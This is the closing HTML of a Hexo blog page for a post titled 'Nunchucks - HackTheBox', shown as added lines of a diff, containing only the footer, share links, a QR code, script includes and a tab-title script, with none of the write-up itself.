+        <p><span>暗羽 &copy; 2014 - 2021</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&title=《Nunchucks - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&title=《Nunchucks - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Nunchucks - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/11/10/Nunchucks-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKUlEQVR42u3aS5LCMAwFQO5/6XAAiPMkB6pit1dTRYjdLDT6+PWK13GyPp/5fP7s0+RbNy8MDIzHMo7hGm+QH2L8zmTf8Y+IgYGxA+Ns4+SZJLwmYXT8noszY2BgYARpXx4ce4kjBgYGxl2MZMs8AcXAwMCoFpPVNDEPtX+txTEwMB7IyLvu///7J/MNDAyMRzGO4rprYJm/LToVBgbG0ow8wPWa+zPjzPJ5MDAwlmb0hpRJAE3CbjUcF3JYDAyMRRnjYjJv3PeCbN7yi8YDGBgYSzCqLf7q0HEqdOYjTAwMjG0YyZZJm6xX1jYBGBgYmzGSBC556V3XxQptPgwMjA0Y+Vixypi/YBH9EBgYGNswqkVsb1TZO+hFaMbAwFiakQwUx7D5Cxm9tPVisoGBgbEQI98y+XQmKFcvW3z5v4GBgbE0Y6aY7B10/pmLIhYDA2NpRn7xIqFWkc2FgYGxNKNaxFaTyLzcrX4XAwNjN0bvDsNdbbjqd6vXyzAwMNZgVC+Vzow2x8E9H0t8OTkGBsYGjPkrF9W0r1cqn74HAwNjG8ZMsdpLBHvhHgMDYx/GfJKXN8t6zbio/YeBgbE0465hZ3UUWg3f1bCOgYGxHiMvTaslbjWt7A0kMDAw9mGMt8xb9nkDrpfqnSIxMDAwgoFiksD1GnMRFQMDAyMoUOeL0urgYSrgYmBgPJBRTe9y0u+KYQwMjH0YeenYGxhUx5N54YqBgbEB4w22n9sZUc1sOwAAAABJRU5ErkJggg==" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
